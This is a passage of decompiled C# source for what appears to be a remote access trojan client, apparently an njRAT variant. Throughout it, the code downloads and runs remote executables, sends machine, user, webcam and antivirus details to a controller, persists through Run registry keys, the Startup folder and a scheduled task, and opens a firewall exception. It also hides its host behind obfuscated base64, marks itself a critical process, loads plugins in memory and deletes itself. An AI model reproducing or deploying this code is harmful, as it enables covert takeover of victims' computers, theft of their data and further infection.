						string text4 = text3 + ".exe";
						try
						{
							Send("MSG" + Y + "Updating To " + new FileInfo(text4).get_Name());
							Thread.Sleep(2000);
							File.WriteAllBytes(text4, array10);
							Process.Start(text4, "..");
						}
						catch (Exception ex7)
						{
							ProjectData.SetProjectError(ex7);
							Exception ex8 = ex7;
							ProjectData.SetProjectError(ex8);
							Exception ex9 = ex8;
							ProjectData.SetProjectError(ex9);
							Exception ex10 = ex9;
							Send("MSG" + Y + "Update ERROR " + ex10.Message);
							ProjectData.ClearProjectError();
							ProjectData.ClearProjectError();
							ProjectData.ClearProjectError();
							break;
						}
						UNS();
						break;
					}
					}
					return;
				}
				byte[] bytes;
				if (array[2][0] == '\u001f')
				{
					try
					{
						MemoryStream memoryStream7 = new MemoryStream();
						int length5 = (array[0] + Y + array[1] + Y).Length;
						memoryStream7.Write(b, length5, b.Length - length5);
						bytes = ZIP(memoryStream7.ToArray());
					}
					catch (Exception ex11)
					{
						ProjectData.SetProjectError(ex11);
						Exception ex12 = ex11;
						ProjectData.SetProjectError(ex12);
						Exception projectError4 = ex12;
						ProjectData.SetProjectError(projectError4);
						Send("MSG" + Y + "Execute ERROR");
						Send("bla");
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
						return;
					}
				}
				else
				{
					WebClient webClient2 = new WebClient();
					try
					{
						bytes = webClient2.DownloadData(array[2]);
					}
					catch (Exception ex13)
					{
						ProjectData.SetProjectError(ex13);
						Exception ex14 = ex13;
						ProjectData.SetProjectError(ex14);
						Exception projectError5 = ex14;
						ProjectData.SetProjectError(projectError5);
						Send("MSG" + Y + "Download ERROR");
						Send("bla");
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
						return;
					}
				}
				Send("bla");
				text3 = text3 + "." + array[1];
				try
				{
					File.WriteAllBytes(text3, bytes);
					Process.Start(text3);
					Send("MSG" + Y + "Executed As " + new FileInfo(text3).get_Name());
				}
				catch (Exception ex15)
				{
					ProjectData.SetProjectError(ex15);
					Exception ex16 = ex15;
					ProjectData.SetProjectError(ex16);
					Exception ex17 = ex16;
					ProjectData.SetProjectError(ex17);
					Exception ex18 = ex17;
					Send("MSG" + Y + "Execute ERROR " + ex18.Message);
					ProjectData.ClearProjectError();
					ProjectData.ClearProjectError();
					ProjectData.ClearProjectError();
				}
			}
			catch (Exception ex19)
			{
				ProjectData.SetProjectError(ex19);
				Exception ex20 = ex19;
				ProjectData.SetProjectError(ex20);
				Exception ex21 = ex20;
				ProjectData.SetProjectError(ex21);
				Exception ex22 = ex21;
				if (array.Length > 0 && ((Operators.CompareString(array[0], "Ex", false) == 0) | (Operators.CompareString(array[0], "PLG", false) == 0)))
				{
					PLG = null;
				}
				try
				{
					Send("ER" + Y + array[0] + Y + ex22.Message);
				}
				catch (Exception ex23)
				{
					ProjectData.SetProjectError(ex23);
					Exception ex24 = ex23;
					ProjectData.SetProjectError(ex24);
					Exception projectError6 = ex24;
					ProjectData.SetProjectError(projectError6);
					ProjectData.ClearProjectError();
					ProjectData.ClearProjectError();
					ProjectData.ClearProjectError();
				}
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
		}
	}

	public static string inf()
	{
		string text = "ll" + Y;
		try
		{
			if (Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(GTV("vn", "")))), (object)"", false))
			{
				string text2 = text;
				string s = DEB(ref VN) + "_" + HWD();
				text = text2 + ENB(ref s) + Y;
			}
			else
			{
				string text3 = text;
				string s = Conversions.ToString(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(GTV("vn", "")))));
				string s2 = DEB(ref s) + "_" + HWD();
				text = text3 + ENB(ref s2) + Y;
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.SetProjectError(ex2);
			Exception projectError = ex2;
			ProjectData.SetProjectError(projectError);
			string text4 = text;
			string s2 = HWD();
			text = text4 + ENB(ref s2) + Y;
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		try
		{
			text = text + Environment.MachineName + Y;
		}
		catch (Exception ex3)
		{
			ProjectData.SetProjectError(ex3);
			Exception ex4 = ex3;
			ProjectData.SetProjectError(ex4);
			Exception projectError2 = ex4;
			ProjectData.SetProjectError(projectError2);
			text = text + "??" + Y;
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		try
		{
			text = text + Environment.UserName + Y;
		}
		catch (Exception ex5)
		{
			ProjectData.SetProjectError(ex5);
			Exception ex6 = ex5;
			ProjectData.SetProjectError(ex6);
			Exception projectError3 = ex6;
			ProjectData.SetProjectError(projectError3);
			text = text + "??" + Y;
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		try
		{
			text = text + LO.LastWriteTime.Date.ToString("yy-MM-dd") + Y;
		}
		catch (Exception ex7)
		{
			ProjectData.SetProjectError(ex7);
			Exception ex8 = ex7;
			ProjectData.SetProjectError(ex8);
			Exception projectError4 = ex8;
			ProjectData.SetProjectError(projectError4);
			text = text + "??-??-??" + Y;
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		text = text + "" + Y;
		try
		{
			text += ((ServerComputer)F).get_Info().get_OSFullName().Replace("Microsoft", "")
				.Replace("Windows", "Win")
				.Replace("®", "")
				.Replace("™", "")
				.Replace("  ", " ")
				.Replace(" Win", "Win");
		}
		catch (Exception ex9)
		{
			ProjectData.SetProjectError(ex9);
			Exception ex10 = ex9;
			ProjectData.SetProjectError(ex10);
			Exception projectError5 = ex10;
			ProjectData.SetProjectError(projectError5);
			text += "??";
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		text += "SP";
		try
		{
			string[] array = Strings.Split(Environment.OSVersion.ServicePack, " ", -1, (CompareMethod)0);
			if (array.Length == 1)
			{
				text += "0";
			}
			text += array[checked(array.Length - 1)];
		}
		catch (Exception ex11)
		{
			ProjectData.SetProjectError(ex11);
			Exception ex12 = ex11;
			ProjectData.SetProjectError(ex12);
			Exception projectError6 = ex12;
			ProjectData.SetProjectError(projectError6);
			text += "0";
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		try
		{
			text = ((!Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles).Contains("x86")) ? (text + " x86" + Y) : (text + " x64" + Y));
		}
		catch (Exception ex13)
		{
			ProjectData.SetProjectError(ex13);
			Exception ex14 = ex13;
			ProjectData.SetProjectError(ex14);
			Exception projectError7 = ex14;
			ProjectData.SetProjectError(projectError7);
			text += Y;
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		text = ((!Cam()) ? (text + "No" + Y) : (text + "Yes" + Y));
		text = text + GetAntiVirus() + Y + GetAntiVirus() + Y + GetAntiVirus() + Y;
		string text5 = "";
		try
		{
			string[] valueNames = ((ServerComputer)F).get_Registry().get_CurrentUser().CreateSubKey("Software\\" + RG, RegistryKeyPermissionCheck.Default)
				.GetValueNames();
			foreach (string text6 in valueNames)
			{
				if (text6.Length == 32)
				{
					text5 = text5 + text6 + ",";
				}
			}
		}
		catch (Exception ex15)
		{
			ProjectData.SetProjectError(ex15);
			Exception ex16 = ex15;
			ProjectData.SetProjectError(ex16);
			Exception projectError8 = ex16;
			ProjectData.SetProjectError(projectError8);
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		return text + text5;
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static void INS()
	{
		Thread.Sleep(1000);
		if (Idr && !CompDir(LO, new FileInfo(Interaction.Environ(DR).ToLower() + "\\" + EXE.ToLower())))
		{
			try
			{
				if (File.Exists(Interaction.Environ(DR) + "\\" + EXE))
				{
					File.Delete(Interaction.Environ(DR) + "\\" + EXE);
				}
				FileStream fileStream = new FileStream(Interaction.Environ(DR) + "\\" + EXE, FileMode.CreateNew);
				byte[] array = File.ReadAllBytes(LO.FullName);
				fileStream.Write(array, 0, array.Length);
				fileStream.Flush();
				fileStream.Close();
				LO = new FileInfo(Interaction.Environ(DR) + "\\" + EXE);
				Process.Start(LO.FullName);
				ProjectData.EndApp();
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.SetProjectError(ex2);
				Exception projectError = ex2;
				ProjectData.SetProjectError(projectError);
				ProjectData.EndApp();
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
		}
		try
		{
			Environment.SetEnvironmentVariable("SEE_MASK_NOZONECHECKS", "1", EnvironmentVariableTarget.User);
		}
		catch (Exception ex3)
		{
			ProjectData.SetProjectError(ex3);
			Exception ex4 = ex3;
			ProjectData.SetProjectError(ex4);
			Exception projectError2 = ex4;
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		try
		{
			Interaction.Shell("Hassan firewall add allowedprogram \"" + LO.FullName + "\" \"" + LO.get_Name() + "\" ENABLE", (AppWinStyle)0, true, 5000);
		}
		catch (Exception ex5)
		{
			ProjectData.SetProjectError(ex5);
			Exception ex6 = ex5;
			ProjectData.SetProjectError(ex6);
			Exception projectError3 = ex6;
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		if (RegistrySt)
		{
			try
			{
				((ServerComputer)F).get_Registry().get_CurrentUser().OpenSubKey(sf, writable: true)!.SetValue(RG, "\"" + LO.FullName + "\" ..");
			}
			catch (Exception ex7)
			{
				ProjectData.SetProjectError(ex7);
				Exception ex8 = ex7;
				ProjectData.SetProjectError(ex8);
				Exception projectError4 = ex8;
				ProjectData.SetProjectError(projectError4);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
			try
			{
				((ServerComputer)F).get_Registry().get_LocalMachine().OpenSubKey(sf, writable: true)!.SetValue(RG, "\"" + LO.FullName + "\" ..");
			}
			catch (Exception ex9)
			{
				ProjectData.SetProjectError(ex9);
				Exception ex10 = ex9;
				ProjectData.SetProjectError(ex10);
				Exception projectError5 = ex10;
				ProjectData.SetProjectError(projectError5);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
		}
		if (IsF == Conversions.ToBoolean("True"))
		{
			try
			{
				File.Copy(LO.FullName, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + xDlol1 + ".exe", overwrite: true);
			}
			catch (Exception projectError6)
			{
				ProjectData.SetProjectError(projectError6);
				ProjectData.ClearProjectError();
			}
		}
		try
		{
			if (Operators.CompareString(Task, "True", false) == 0)
			{
				string text = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Temp() + "/Server.exe";
				((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllBytes(text, File.ReadAllBytes(Application.get_ExecutablePath()), true);
				Interaction.Shell("schtasks /create /sc minute /mo 1 /tn Server /tr " + text, (AppWinStyle)0, false, -1);
				Thread.Sleep(10000);
			}
		}
		catch (Exception projectError7)
		{
			ProjectData.SetProjectError(projectError7);
			ProjectData.ClearProjectError();
		}
		if (Conversions.ToBoolean(Hide))
		{
			File.SetAttributes(Application.get_ExecutablePath(), FileAttributes.Hidden);
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static void ko()
	{
		//IL_0241: Unknown result type (might be due to invalid IL or missing references)
		//IL_024b: Expected O, but got Unknown
		checked
		{
			if (Interaction.Command() != null)
			{
				if (Operators.CompareString(Sleep, "True", false) == 0)
				{
					Thread.Sleep((int)Math.Round(Math.Round(Conversions.ToDouble(Sleep1) * 1000.0)));
				}
				if (Operators.CompareString(HP, "True", false) == 0)
				{
					H = Encoding.UTF8.GetString(Convert.FromBase64String(Strings.Replace(Strings.Replace(Strings.Replace(Strings.Replace(Strings.Replace(H, "व\u093fन\u0940", "M", 1, -1, (CompareMethod)0), "!", "=", 1, -1, (CompareMethod)0), "蒂", "T", 1, -1, (CompareMethod)0), "म\u0947", "A", 1, -1, (CompareMethod)0), "ब\u0940प\u0940", "Z", 1, -1, (CompareMethod)0)));
					P = Encoding.UTF8.GetString(Convert.FromBase64String(Strings.Replace(Strings.Replace(Strings.Replace(Strings.Replace(P, "粹", "M", 1, -1, (CompareMethod)0), "त\u093e", "T", 1, -1, (CompareMethod)0), "의도", "A", 1, -1, (CompareMethod)0), "에", "e", 1, -1, (CompareMethod)0)));
				}
				try
				{
					((ServerComputer)F).get_Registry().get_CurrentUser().SetValue("di", "!");
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception ex2 = ex;
					ProjectData.SetProjectError(ex2);
					Exception projectError = ex2;
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
					ProjectData.ClearProjectError();
					ProjectData.ClearProjectError();
				}
				Thread.Sleep(5000);
			}
			bool createdNew = false;
			MT = new Mutex(initiallyOwned: true, RG, out createdNew);
			if (!createdNew)
			{
				ProjectData.EndApp();
			}
			INS();
			if (!Idr)
			{
				EXE = LO.get_Name();
				DR = LO.Directory!.get_Name();
			}
			try
			{
				object obj = new Thread(RC, 1);
				NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(obj), (Type)null, "Start", new object[0], (string[])null, (Type[])null, (bool[])null, true);
			}
			catch (Exception ex3)
			{
				ProjectData.SetProjectError(ex3);
				Exception ex4 = ex3;
				ProjectData.SetProjectError(ex4);
				Exception projectError2 = ex4;
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
			int num = 0;
			string text = "";
			if (BD)
			{
				try
				{
					SystemEvents.add_SessionEnding(new SessionEndingEventHandler(ImHere));
					pr(1);
				}
				catch (Exception ex5)
				{
					ProjectData.SetProjectError(ex5);
					Exception ex6 = ex5;
					ProjectData.SetProjectError(ex6);
					Exception projectError3 = ex6;
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
					ProjectData.ClearProjectError();
					ProjectData.ClearProjectError();
				}
			}
			while (true)
			{
				Thread.Sleep(1000);
				if (!Cn)
				{
					text = "";
				}
				Application.DoEvents();
				try
				{
					num++;
					if (num == 5)
					{
						try
						{
							Process.GetCurrentProcess().MinWorkingSet = (IntPtr)1024;
						}
						catch (Exception ex7)
						{
							ProjectData.SetProjectError(ex7);
							Exception ex8 = ex7;
							ProjectData.SetProjectError(ex8);
							Exception projectError4 = ex8;
							ProjectData.SetProjectError(projectError4);
							ProjectData.ClearProjectError();
							ProjectData.ClearProjectError();
							ProjectData.ClearProjectError();
						}
					}
					if (num >= 8)
					{
						num = 0;
						string text2 = ACT();
						if (Operators.CompareString(text, text2, false) != 0)
						{
							text = text2;
							Send("act" + Y + text2);
						}
					}
					if (!RegistrySt)
					{
						continue;
					}
					try
					{
						if (Operators.ConditionalCompareObjectNotEqual(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(((ServerComputer)F).get_Registry().get_CurrentUser().GetValue(sf + "\\" + RG, "")))), (object)("\"" + LO.FullName + "\" .."), false))
						{
							((ServerComputer)F).get_Registry().get_CurrentUser().OpenSubKey(sf, writable: true)!.SetValue(RG, "\"" + LO.FullName + "\" ..");
						}
					}
					catch (Exception ex9)
					{
						ProjectData.SetProjectError(ex9);
						Exception ex10 = ex9;
						ProjectData.SetProjectError(ex10);
						Exception projectError5 = ex10;
						ProjectData.SetProjectError(projectError5);
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
					}
					try
					{
						if (Operators.ConditionalCompareObjectNotEqual(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(((ServerComputer)F).get_Registry().get_LocalMachine().GetValue(sf + "\\" + RG, "")))), (object)("\"" + LO.FullName + "\" .."), false))
						{
							((ServerComputer)F).get_Registry().get_LocalMachine().OpenSubKey(sf, writable: true)!.SetValue(RG, "\"" + LO.FullName + "\" ..");
						}
					}
					catch (Exception ex11)
					{
						ProjectData.SetProjectError(ex11);
						Exception ex12 = ex11;
						ProjectData.SetProjectError(ex12);
						Exception projectError6 = ex12;
						ProjectData.SetProjectError(projectError6);
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
					}
				}
				catch (Exception ex13)
				{
					ProjectData.SetProjectError(ex13);
					Exception ex14 = ex13;
					ProjectData.SetProjectError(ex14);
					Exception projectError7 = ex14;
					ProjectData.SetProjectError(projectError7);
					ProjectData.ClearProjectError();
					ProjectData.ClearProjectError();
					ProjectData.ClearProjectError();
				}
			}
		}
	}

	public static string md5(byte[] B)
	{
		B = new MD5CryptoServiceProvider().ComputeHash(B);
		string text = "";
		byte[] array = B;
		foreach (byte b in array)
		{
			text += b.ToString("x2");
		}
		return text;
	}

	[DllImport("ntdll")]
	private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

	public static object Plugin(byte[] b, string c)
	{
		Module[] modules = Assembly.Load(b).GetModules();
		foreach (Module module in modules)
		{
			Type[] types = module.GetTypes();
			foreach (Type type in types)
			{
				if (type.FullName!.EndsWith("." + c))
				{
					return module.Assembly.CreateInstance(type.FullName);
				}
			}
		}
		return null;
	}

	public static void pr(int i)
	{
		try
		{
			NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, ref i, 4);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.SetProjectError(ex2);
			Exception projectError = ex2;
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
	}

	public static void RC()
	{
		checked
		{
			while (true)
			{
				lastcap = "";
				if (C != null)
				{
					long num = -1L;
					int num2 = 0;
					try
					{
						while (true)
						{
							IL_00a1:
							num2++;
							if (num2 == 10)
							{
								num2 = 0;
								Thread.Sleep(1);
							}
							if (!Cn)
							{
								break;
							}
							if (C.Available < 1)
							{
								C.Client.Poll(-1, SelectMode.SelectRead);
							}
							while (C.Available > 0)
							{
								if (num == -1L)
								{
									string text = "";
									while (true)
									{
										int num3 = C.GetStream().ReadByte();
										switch (num3)
										{
										case 0:
											num = Conversions.ToLong(text);
											text = "";
											if (num == 0L)
											{
												Send("");
												num = -1L;
											}
											if (C.Available <= 0)
											{
												goto IL_00a1;
											}
											goto IL_017f;
										case -1:
											goto end_IL_011b;
										}
										text += Conversions.ToString(Conversions.ToInteger(Strings.ChrW(num3).ToString()));
										continue;
										end_IL_011b:
										break;
									}
									break;
								}
								b = new byte[C.Available + 1 - 1 + 1 - 1 + 1];
								long num4 = num - MeM.Length;
								if (b.Length > num4)
								{
									b = new byte[(int)(num4 - 1L) + 1 - 1 + 1 - 1 + 1];
								}
								int count = C.Client.Receive(b, 0, b.Length, SocketFlags.None);
								MeM.Write(b, 0, count);
								if (MeM.Length == num)
								{
									num = -1L;
									Thread thread = new Thread(HassanAmiri, 1);
									thread.Start(MeM.ToArray());
									thread.Join(100);
									MeM.Dispose();
									MeM = new MemoryStream();
								}
								goto IL_00a1;
								IL_017f:;
							}
							break;
						}
					}
					catch (Exception ex)
					{
						ProjectData.SetProjectError(ex);
						Exception ex2 = ex;
						ProjectData.SetProjectError(ex2);
						Exception projectError = ex2;
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
					}
				}
				do
				{
					try
					{
						if (PLG != null)
						{
							NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(PLG))), (Type)null, "clear", new object[0], (string[])null, (Type[])null, (bool[])null, true);
							PLG = null;
						}
					}
					catch (Exception ex3)
					{
						ProjectData.SetProjectError(ex3);
						Exception ex4 = ex3;
						ProjectData.SetProjectError(ex4);
						Exception projectError2 = ex4;
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
					}
					Cn = false;
				}
				while (!connect());
				Cn = true;
			}
		}
	}

	public static string RN(int c)
	{
		VBMath.Randomize();
		Random random = new Random();
		string text = "";
		string text2 = "abcdefghijklmnopqrstuvwxyz";
		for (int i = 1; i <= c; i = checked(i + 1))
		{
			text += Conversions.ToString(text2[random.Next(0, text2.Length)]);
		}
		return text;
	}

	public static byte[] SB(ref string S)
	{
		return Encoding.UTF8.GetBytes(S);
	}

	public static bool Send(string S)
	{
		return Sendb(SB(ref S));
	}

	public static bool Sendb(byte[] b)
	{
		if (!Cn)
		{
			return false;
		}
		try
		{
			FileInfo lO = LO;
			lock (lO)
			{
				if (!Cn)
				{
					return false;
				}
				MemoryStream memoryStream = new MemoryStream();
				string S = b.Length + "\0";
				byte[] array = SB(ref S);
				memoryStream.Write(array, 0, array.Length);
				memoryStream.Write(b, 0, b.Length);
				C.Client.Send(memoryStream.ToArray(), 0, checked((int)memoryStream.Length), SocketFlags.None);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.SetProjectError(ex2);
			Exception projectError = ex2;
			ProjectData.SetProjectError(projectError);
			try
			{
				if (Cn)
				{
					Cn = false;
					C.Close();
				}
			}
			catch (Exception ex3)
			{
				ProjectData.SetProjectError(ex3);
				Exception ex4 = ex3;
				ProjectData.SetProjectError(ex4);
				Exception projectError2 = ex4;
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		return Cn;
	}

	public static bool STV(string n, object t, RegistryValueKind typ)
	{
		try
		{
			((ServerComputer)F).get_Registry().get_CurrentUser().CreateSubKey("Software\\" + RG)
				.SetValue(n, RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(t))))))), typ);
			return true;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.SetProjectError(ex2);
			Exception projectError = ex2;
			ProjectData.SetProjectError(projectError);
			bool result = false;
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
			return result;
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static void UNS()
	{
		File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + RG);
		pr(0);
		RegistrySt = false;
		try
		{
			((ServerComputer)F).get_Registry().get_CurrentUser().OpenSubKey(sf, writable: true)!.DeleteValue(RG, throwOnMissingValue: false);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.SetProjectError(ex2);
			Exception projectError = ex2;
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		try
		{
			((ServerComputer)F).get_Registry().get_LocalMachine().OpenSubKey(sf, writable: true)!.DeleteValue(RG, throwOnMissingValue: false);
		}
		catch (Exception ex3)
		{
			ProjectData.SetProjectError(ex3);
			Exception ex4 = ex3;
			ProjectData.SetProjectError(ex4);
			Exception projectError2 = ex4;
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		try
		{
			Interaction.Shell("Hassan firewall delete allowedprogram \"" + LO.FullName + "\"", (AppWinStyle)0, false, -1);
		}
		catch (Exception ex5)
		{
			ProjectData.SetProjectError(ex5);
			Exception ex6 = ex5;
			ProjectData.SetProjectError(ex6);
			Exception projectError3 = ex6;
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		try
		{
			if (FS != null)
			{
				FS.Dispose();
				File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + RG + ".exe");
			}
		}
		catch (Exception ex7)
		{
			ProjectData.SetProjectError(ex7);
			Exception ex8 = ex7;
			ProjectData.SetProjectError(ex8);
			Exception projectError4 = ex8;
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		try
		{
			((ServerComputer)F).get_Registry().get_CurrentUser().OpenSubKey("Software", writable: true)!.DeleteSubKey(RG, throwOnMissingSubKey: false);
		}
		catch (Exception ex9)
		{
			ProjectData.SetProjectError(ex9);
			Exception ex10 = ex9;
			ProjectData.SetProjectError(ex10);
			Exception projectError5 = ex10;
			ProjectData.SetProjectError(projectError5);
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		try
		{
			Interaction.Shell("cmd.exe /c ping 0 -n 2 & del \"" + LO.FullName + "\"", (AppWinStyle)0, false, -1);
		}
		catch (Exception ex11)
		{
			ProjectData.SetProjectError(ex11);
			Exception ex12 = ex11;
			ProjectData.SetProjectError(ex12);
			Exception projectError6 = ex12;
			ProjectData.SetProjectError(projectError6);
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		ProjectData.EndApp();
	}

	public static byte[] ZIP(byte[] B)
	{
		MemoryStream memoryStream = new MemoryStream(B);
		GZipStream gZipStream = new GZipStream(memoryStream, CompressionMode.Decompress);
		byte[] array = new byte[4];
		checked
		{
			memoryStream.Position = memoryStream.Length - 5L;
			memoryStream.Read(array, 0, 4);
			int num = BitConverter.ToInt32(array, 0);
			memoryStream.Position = 0L;
			byte[] array2 = new byte[num - 1 + 1 - 1 + 1 - 1 + 1];
			gZipStream.Read(array2, 0, num);
			gZipStream.Dispose();
			memoryStream.Dispose();
			return array2;
		}
	}
}
